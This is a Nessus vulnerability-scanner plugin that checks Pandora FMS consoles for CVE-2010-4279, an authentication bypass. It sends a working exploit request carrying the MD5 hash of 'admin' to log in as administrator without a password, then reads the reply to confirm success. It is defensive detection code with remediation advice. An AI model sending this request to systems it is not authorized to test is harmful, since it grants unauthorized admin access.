#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50861);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2010-4279");
  script_bugtraq_id(45112);
  script_osvdb_id(69549);
  script_xref(name:"EDB-ID", value:"15639");

  script_name(english:"Pandora FMS Console Authentication Bypass");
  script_summary(english:"Attempts to access the console as admin.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web console on the remote host is affected by an authentication
bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The Pandora FMS console hosted on the remote web server is affected by
an authentication bypass vulnerability. The 'auto login (hash) password'
feature allows third parties to authenticate using a combination of
username and a shared secret. This shared secret is undefined by
default, which means it is possible to authenticate solely by
providing the hash of a valid username.

A remote attacker can exploit this issue to access the console as
admin.

This version of Pandora FMS is also affected by other vulnerabilities;
however, Nessus has not tested for those issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://openideas.info/smf/index.php/topic,1825.0.html");
  script_set_attribute(
    attribute:"see_also",
    value:"http://openideas.info/smf/index.php/topic,2083.0.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"Apply the security fix for Pandora FMS 3.1, or upgrade to version
3.1.1 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Pandora FMS v3.1 Auth Bypass and Arbitrary File Upload Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/11/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/12/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:artica:pandora_fms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("pandora_fms_console_detect.nasl");
  script_require_keys("installed_sw/Pandora FMS");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'Pandora FMS';
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:80, php:TRUE);
install = get_single_install(app_name:app, port:port);

user = 'admin';
hash = hexstr(MD5(user));
url = install['path'] + '/index.php?loginhash_data=' + hash + '&loginhash_user=' + user + '&loginhash=1';
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

if ('[<b>' + user + '</b>]</a>' >< res[2])
{
  if (report_verbosity > 0)
  {
    # In vulnerable versions, we'll be able to fingerprint the vulnerability even
    # if we're unable to guess a valid username (the page header indicates we're
    # logged in, but nothing in the console is available).  If this happens, we
    # should probably make a note of it
    if (
      'Welcome to Pandora FMS Web Console</ul>' >!< res[2] ||
      'Access to this page is restricted to authorized users only' >< res[2]
    )
    {
      trailer =
        'Nessus attempted to login as "' + user + '" which does not appear to be a\n' +
        'valid user. This means Nessus was able to verify the vulnerability,\n' +
        'but was unable to get unauthorized access to the console.';
    }
    else trailer = NULL;

    report =
      'Nessus was able to verify the issue using the following URL :\n\n' +
      '  ' + build_url(qs:url, port:port) + '\n';
    if (!isnull(trailer)) report += '\n' + trailer;
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else
{
  base = build_url(qs:install['dir'], port:port);
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, base);
}
